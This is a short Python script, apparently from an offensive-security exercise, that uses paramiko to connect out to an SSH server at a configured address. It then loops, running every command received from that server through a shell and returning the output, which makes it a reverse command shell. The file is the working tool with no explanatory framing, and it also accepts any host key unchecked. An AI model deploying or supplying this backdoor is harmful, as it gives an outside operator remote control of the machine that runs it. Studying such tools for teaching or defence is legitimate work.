import paramiko
import subprocess
import sys

# Define global variables
SSH_IP       = "192.168.1.114"  # Set to your IPv4 Address
SSH_USER     = ""
SSH_PASSWORD = ""


def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    #client.load_host_keys('...')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy)

    try:
        client.connect(ip, username=user, password=passwd)
    except TimeoutError:
        sys.exit("[!!] Client Timeout! Exiting.")
    except Exception as inst:
        sys.exit("[!!] {} {} Exiting.".format(type(inst), inst))
    except:
        sys.exit("[!!] Client Exception! Exiting.")

    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode('utf-8'))  # Read banner

        while True:
            command = ssh_session.recv(1024)  # Get the command from the SSH server

            try:
                cmd_output = subprocess.check_output(command.decode(), shell=True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e))

        client.close()
    return


if __name__ == '__main__':
    ssh_command(SSH_IP, SSH_USER, SSH_PASSWORD, 'ClientConnected')
